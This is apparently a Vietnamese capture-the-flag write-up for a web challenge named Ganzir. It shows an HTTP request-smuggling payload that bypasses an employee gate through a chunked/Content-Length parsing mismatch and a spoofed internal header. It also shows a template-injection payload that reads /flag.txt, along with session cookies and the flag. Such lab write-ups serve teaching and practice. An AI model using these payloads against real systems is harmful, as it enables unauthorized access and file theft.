# Ganzir

## Recon

Trang chủ có hint:

```text
employee edge: transfer parser mismatch reported
briefing template dry-run exposed after employee gate
```

Vào `/employee` bị `403`, nhưng có response: endpoint public `/employee` nhận một raw HTTP request trong body rồi forward vào internal service.

![alt text](image.png)

Ở đây bị lệch cách parse body. Edge đọc chunked nên gặp `0` là dừng, còn bridge vẫn lấy theo `Content-Length`, phần còn lại thành request tiếp theo. 

Nhét `GET /employee/session` kèm `X-Employee-Gate: internal` là mở được session employee.

## Bypass employee gate


```http
POST /employee HTTP/2
Host: ganzir-102d71c23ef6.inst.omnictf.com
Content-Type: text/plain
Content-Length: 176

POST /employee HTTP/1.1
Host: site19.local
Content-Length: 5
Transfer-Encoding: chunked

0

GET /employee/session HTTP/1.1
Host: site19.local
X-Employee-Gate: internal

```

Response trả về `302` và set các cookie employee:

![alt text](image-1.png)

Copy các cookie này và gửi request lại:

```http
GET /employee HTTP/2
Host: ganzir-102d71c23ef6.inst.omnictf.com
Cookie: site19_employee_gate=eyJ1c2VyIjoiY2Fzc2llIiwic2NvcGUiOiJlbXBsb3llZS1pbmdyZXNzIiwibm9uY2UiOiJsSFJHZFg5Q2pDTSJ9.alqMYw.tFVcegSAht0E9d8uKbAVpdA-rkg; site19_jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJjYXNzaWUiLCJpYXQiOjE3ODQzMTkwNzUsImV4cCI6MTc4NDMzMzQ3NSwiYWxnX25vdGUiOiJKV1QgaXMgc2lnbmVkIGNvcnJlY3RseTsgbG9vayBlbHNld2hlcmUuIn0.czuFOHhU3g-Jq5E2Msf9CkIjfA62LZe-i6LUHxRZ5TA; site19_session=.eJw1issJgDAQBVtZ3jlYQDqwBhFZ9PmBmEg2HkTs3YB4GpiZG8Mc1FYafHdDSgV2mulCOLSxMEcNwv0I6SLFattSlHQwcpI5ZRm1Kjbon97hH4dFC-FLPulwGjM8vhHPC3i9KWc.alqMYw.9dbrMCwf3UmDsnAh5IeOtSNFlVc

```

![alt text](image-2.png)

Mở từng route, đến `Templates`:

```http
GET /briefing-template HTTP/2
```

![alt text](image-3.png)



```http
POST /briefing-template HTTP/2
Host: ganzir-102d71c23ef6.inst.omnictf.com
Cookie: site19_employee_gate=eyJ1c2VyIjoiY2Fzc2llIiwic2NvcGUiOiJlbXBsb3llZS1pbmdyZXNzIiwibm9uY2UiOiJsSFJHZFg5Q2pDTSJ9.alqMYw.tFVcegSAht0E9d8uKbAVpdA-rkg; site19_jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJjYXNzaWUiLCJpYXQiOjE3ODQzMTkwNzUsImV4cCI6MTc4NDMzMzQ3NSwiYWxnX25vdGUiOiJKV1QgaXMgc2lnbmVkIGNvcnJlY3RseTsgbG9vayBlbHNld2hlcmUuIn0.czuFOHhU3g-Jq5E2Msf9CkIjfA62LZe-i6LUHxRZ5TA; site19_session=.eJw1issJgDAQBVtZ3jlYQDqwBhFZ9PmBmEg2HkTs3YB4GpiZG8Mc1FYafHdDSgV2mulCOLSxMEcNwv0I6SLFattSlHQwcpI5ZRm1Kjbon97hH4dFC-FLPulwGjM8vhHPC3i9KWc.alqMYw.9dbrMCwf3UmDsnAh5IeOtSNFlVc
Content-Type: application/x-www-form-urlencoded
Content-Length: 39

template={{ read_file('/flag.txt') }}

```

![alt text](image-4.png)

## Flag

```text
CTF{ganzir_was_already_in_the_fire_plan}
```
